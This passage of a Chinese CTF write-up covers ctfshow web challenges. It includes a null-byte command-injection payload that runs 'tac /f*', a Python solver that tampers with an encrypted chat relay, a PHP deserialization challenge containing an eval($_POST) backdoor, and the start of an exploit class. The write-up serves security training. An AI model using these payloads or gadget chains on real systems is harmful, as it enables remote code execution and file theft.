+</span></span><span class=line><span class=cl>                <span class=k>throw</span> <span class=k>new</span> <span class=nx>\Exception</span><span class=p>(</span><span class=s2>&#34;Ref invalid!&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>checkByte</span><span class=p>(</span><span class=nv>$check</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>ord</span><span class=p>(</span><span class=nv>$check</span><span class=p>)</span> <span class=o>&lt;=</span><span class=nx>self</span><span class=o>::</span><span class=na>__REF_OFFSET_5</span> <span class=o>||</span> <span class=nx>ord</span><span class=p>(</span><span class=nv>$check</span><span class=p>)</span> <span class=o>&gt;=</span><span class=nx>self</span><span class=o>::</span><span class=na>__REF_OFFSET_2</span> <span class=p>){</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=k>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>ord</span><span class=p>(</span><span class=nv>$check</span><span class=p>)</span> <span class=o>&gt;=</span><span class=nx>self</span><span class=o>::</span><span class=na>__REF_OFFSET_3</span> <span class=o>&amp;&amp;</span> <span class=nx>ord</span><span class=p>(</span><span class=nv>$check</span><span class=p>)</span> <span class=o>&lt;=</span> <span class=nx>self</span><span class=o>::</span><span class=na>__REF_OFFSET_4</span> 
+</span></span><span class=line><span class=cl>            <span class=o>&amp;&amp;</span> <span class=nx>ord</span><span class=p>(</span><span class=nv>$check</span><span class=p>)</span> <span class=o>!==</span> <span class=nx>self</span><span class=o>::</span><span class=na>__REF_OFFSET_6</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=k>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__construct</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span><span class=o>=</span><span class=nx>fopen</span><span class=p>(</span><span class=s2>&#34;php://memory&#34;</span><span class=p>,</span><span class=s2>&#34;wb&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>readNeaten</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=nx>fclose</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$c</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>C</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$c</span><span class=o>-&gt;</span><span class=na>main</span><span class=p>();</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>data=aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaab%00system%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00tac%20/f*
+</span></span></code></pre></td></tr></table></div></div><h1 id=暗网聊天室>暗网聊天室</h1><p>一个密码题这里借用师傅的脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.PublicKey</span> <span class=kn>import</span> <span class=n>RSA</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>PKCS1_v1_5</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>abort</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://xxx.challenge.ctf.show/&#39;</span> <span class=c1># 题目URL，先等几秒再运行</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 加密</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>encrypt</span><span class=p>(</span><span class=n>plaintext</span><span class=p>,</span> <span class=n>public_key</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>PKCS1_v1_5</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>RSA</span><span class=o>.</span><span class=n>importKey</span><span class=p>(</span><span class=n>public_key</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>ciphertext</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>plaintext</span><span class=p>),</span> <span class=mi>128</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>ciphertext</span> <span class=o>+=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>plaintext</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>128</span><span class=p>]</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>ciphertext</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_plaintext_half</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>text</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s1>&#39;/update&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>text</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=s1>&#39;[^@]*\.92&#39;</span><span class=p>,</span> <span class=n>text</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_public_key</span><span class=p>(</span><span class=n>public_key</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>text</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s1>&#39;/shop?api=127.0.0.1:9999&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>text</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=s1>&#39;-----BEGIN PUBLIC KEY-----</span><span class=se>\n</span><span class=s1>.*</span><span class=se>\n</span><span class=s1>.*</span><span class=se>\n</span><span class=s1>.*</span><span class=se>\n</span><span class=s1>.*</span><span class=se>\n</span><span class=s1>.*</span><span class=se>\n</span><span class=s1>.*</span><span class=se>\n</span><span class=s1>.*</span><span class=se>\n</span><span class=s1>-----END PUBLIC KEY-----&#39;</span><span class=p>,</span> <span class=n>text</span><span class=p>)[</span><span class=n>public_key</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>IP</span> <span class=o>=</span> <span class=s1>&#39;2.56.12.89&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>plaintext_half</span> <span class=o>=</span> <span class=n>get_plaintext_half</span><span class=p>()</span> <span class=c1># 获取解密后的数据</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 获取公钥2、3</span>
+</span></span><span class=line><span class=cl><span class=n>public_key2</span> <span class=o>=</span> <span class=n>get_public_key</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;-----BEGIN PUBLIC KEY-----&#39;</span><span class=p>,</span><span class=s1>&#39;-----BEGIN PUBLIC KEY-----</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;-----END PUBLIC KEY-----&#39;</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>-----END PUBLIC KEY-----&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>public_key3</span> <span class=o>=</span> <span class=n>get_public_key</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;-----BEGIN PUBLIC KEY-----&#39;</span><span class=p>,</span><span class=s1>&#39;-----BEGIN PUBLIC KEY-----</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;-----END PUBLIC KEY-----&#39;</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>-----END PUBLIC KEY-----&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 两次加密</span>
+</span></span><span class=line><span class=cl><span class=n>IP_ciphertext</span> <span class=o>=</span> <span class=n>encrypt</span><span class=p>(</span><span class=n>IP</span><span class=p>,</span> <span class=n>public_key3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>IP_ciphertext</span> <span class=o>=</span> <span class=n>encrypt</span><span class=p>(</span><span class=n>IP_ciphertext</span><span class=p>,</span> <span class=n>public_key2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 替换最终IP</span>
+</span></span><span class=line><span class=cl><span class=n>plaintext_half_new</span> <span class=o>=</span> <span class=n>plaintext_half</span><span class=p>[:</span><span class=mi>2048</span><span class=p>]</span> <span class=o>+</span> <span class=n>IP_ciphertext</span> <span class=o>+</span> <span class=n>plaintext_half</span><span class=p>[</span><span class=mi>4096</span><span class=p>:]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 请求</span>
+</span></span><span class=line><span class=cl><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s1>&#39;/pass_message&#39;</span><span class=p>,</span><span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;message&#39;</span><span class=p>:</span><span class=n>plaintext_half_new</span><span class=p>})</span>
+</span></span><span class=line><span class=cl><span class=c1># 接收明文</span>
+</span></span><span class=line><span class=cl><span class=n>text</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>+</span><span class=s1>&#39;/update&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>text</span>
+</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=s1>&#39;ctfshow{.*}&#39;</span><span class=p>,</span> <span class=n>text</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>input</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><h1 id=被遗忘的反序列化>被遗忘的反序列化</h1><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span><span class=lnt>86
+</span><span class=lnt>87
+</span><span class=lnt>88
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 当前目录中有一个txt文件哦
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>include</span><span class=p>(</span><span class=s2>&#34;check.php&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>EeE</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$text</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$eeee</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>text</span> <span class=o>==</span> <span class=s2>&#34;aaaa&#34;</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=nx>lcfirst</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>text</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__get</span><span class=p>(</span><span class=nv>$kk</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;</span><span class=si>$kk</span><span class=s2>,eeeeeeeeeeeee&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__clone</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$a</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>cycycycy</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$a</span> <span class=o>-&gt;</span> <span class=na>aaa</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>cycycycy</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$a</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$b</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>aaa</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$get</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;get&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$get</span> <span class=o>=</span> <span class=nx>cipher</span><span class=p>(</span><span class=nv>$get</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$get</span> <span class=o>===</span> <span class=s2>&#34;p8vfuv8g8v8py&#34;</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>            <span class=k>eval</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;eval&#34;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__invoke</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$a_a</span> <span class=o>=</span> <span class=nv>$this</span> <span class=o>-&gt;</span> <span class=na>a</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;</span><span class=se>\$</span><span class=s2>a_a</span><span class=se>\$</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>gBoBg</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$file</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$coos</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$eeee</span><span class=o>=</span><span class=s2>&#34;-_-&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__toString</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>name</span><span class=p>)){</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$a</span> <span class=o>=</span> <span class=k>new</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>coos</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>file</span><span class=p>);</span>    <span class=c1>//将coos作为类使用
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>echo</span> <span class=nv>$a</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span><span class=k>else</span> <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$this</span> <span class=o>-&gt;</span> <span class=na>file</span><span class=p>)){</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>coos</span><span class=o>-&gt;</span><span class=na>name</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span><span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$aa</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>coos</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$bb</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>file</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=nv>$aa</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>   
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>w_wuw_w</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$aaa</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$key</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$file</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/php|63|\*|\?/i&#34;</span><span class=p>,</span><span class=nv>$this</span> <span class=o>-&gt;</span> <span class=na>key</span><span class=p>)){</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>key</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$this</span> <span class=o>-&gt;</span> <span class=na>file</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span><span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;不行哦&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>aaa</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__invoke</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span> <span class=o>-&gt;</span> <span class=na>aaa</span> <span class=o>=</span> <span class=k>clone</span> <span class=k>new</span> <span class=nx>EeE</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$_ip</span> <span class=o>=</span> <span class=nv>$_SERVER</span><span class=p>[</span><span class=s2>&#34;HTTP_AAAAAA&#34;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_ip</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>传参方式首先是<code>HTTP</code>头来传参，再者有个<code>txt</code>文件需要读</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>lcfirst() 是 PHP 中的一个字符串处理函数，它的作用是将给定字符串的第一个字符转换为小写。
+</span></span></code></pre></td></tr></table></div></div><p>审计代码，发现有个<code>cipher</code>方法我们不知道，如果知道的话，传参就可以直接RCE了
+其后发现本身写的类<code>w_wuw_w</code>就可以读取文件
+EXP1</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>w_wuw_w</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$aaa</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$key</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$file</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/php|63|\*|\?/i&#34;</span><span class=p>,</span><span class=nv>$this</span> <span class=o>-&gt;</span> <span class=na>key</span><span class=p>)){</span>
